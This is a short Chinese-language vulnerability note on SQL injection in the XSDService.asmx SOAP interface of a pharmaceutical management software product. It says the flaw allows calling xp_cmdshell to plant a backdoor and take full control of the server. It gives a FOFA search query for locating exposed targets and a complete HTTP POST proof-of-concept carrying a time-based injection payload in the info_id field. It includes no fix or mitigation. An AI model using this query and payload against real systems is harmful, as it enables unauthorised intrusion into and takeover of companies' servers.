## 药业管理软件XSDService.asmx存在SQL注入漏洞

## 一、漏洞简介
药业管理软件是一款针对我国医药或医疗器械企业经营管理特点而设计的综合管理软件。药业管理软件的XSDService.asmx接口（如GetPdaTable、ExecPdaSql等方法）存在SQL注入漏洞。攻击者可利用这些接口，通过发送恶意SQL语句，调用xp_cmdshell写入后门文件，实现对服务器的完全控制。

## fofa
```
body="XSDService.asmx"
```

## POC
```
POST /XSDService.asmx HTTP/1.1Host: X.X.X.XContent-Type: text/xml; charset=utf-8Content-Length: 490SOAPAction: "http://tempuri.org/SetMedia_Picture_info"<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <SetMedia_Picture_info xmlns="http://tempuri.org/">      <info_id>1';WAITFOR DELAY '0:0:5'--</info_id>      <info_file_name>string</info_file_name>      <info_data>base64Binary</info_data>    </SetMedia_Picture_info>  </soap:Body></soap:Envelope>
```
